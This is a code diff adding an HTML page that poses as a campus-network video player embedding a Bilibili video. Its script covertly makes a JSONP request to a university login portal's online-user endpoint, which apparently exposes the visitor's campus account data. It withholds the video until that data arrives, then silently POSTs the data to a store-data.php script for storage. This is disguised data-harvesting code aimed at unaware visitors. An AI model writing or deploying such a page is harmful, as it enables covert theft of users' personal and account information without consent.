@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>校园网视频播放页面</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        #loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        #loading .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #09f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #message {
+            margin-left: 10px;
+            font-size: 16px;
+            color: #555;
+        }
+
+        #video-container {
+            display: none;
+            width: 100%;
+            max-width: 800px;
+            background: #000;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        iframe {
+            width: 100%;
+            height: 450px;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <div class="spinner"></div>
+        <div id="message">检测中，请稍候...</div>
+    </div>
+
+    <div id="video-container">
+        <iframe src="//player.bilibili.com/player.html?isOutside=true&aid=928861104&bvid=BV1uT4y1P7CX&cid=287639008&p=1" 
+                allowfullscreen="true"></iframe>
+    </div>
+
+    <script>
+        // 设置超时时间（5秒）
+        let timeoutHandle = setTimeout(() => {
+            document.getElementById('message').textContent = '请求超时，请使用校园网访问。';
+            document.getElementById('loading').style.backgroundColor = '#f8d7da';
+            document.getElementById('message').style.color = '#721c24';
+        }, 5000);
+
+        // 定义 JSONP 回调函数
+        function jsonpReturn(data) {
+            clearTimeout(timeoutHandle);
+            console.log('接口返回数据:', data);
+            
+            if (data && data.result === 1) {
+                // 显示视频，隐藏加载动画
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('video-container').style.display = 'block';
+
+                // 发送数据到服务器进行存储
+                //console.log('开始发送数据到服务器进行存储');
+                sendDataToServer(data);
+            } else {
+                document.getElementById('message').textContent = '无法获取用户信息，请确认您的网络连接。';
+                document.getElementById('loading').style.backgroundColor = '#f8d7da';
+                document.getElementById('message').style.color = '#721c24';
+            }
+        }
+
+        // 动态创建 script 标签来请求 JSONP 数据
+        const script = document.createElement('script');
+        script.src = 'https://login.bjtu.edu.cn:802/eportal/portal/online_list?callback=jsonpReturn';
+        document.body.appendChild(script);
+
+        // 将数据发送到服务器的函数
+        function sendDataToServer(userData) {
+            //console.log('准备发送的数据:', userData);
+
+            fetch('store-data.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    user_data: userData
+                })
+            })
+            .then(response => {
+                console.log('服务器响应状态:', response.status);
+                if (!response.ok) {
+                    console.error('服务器响应错误:', response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => console.log('数据成功存储:', data))
+            .catch(error => console.error('数据存储失败:', error));
+        }
+    </script>
+</body>
+</html>
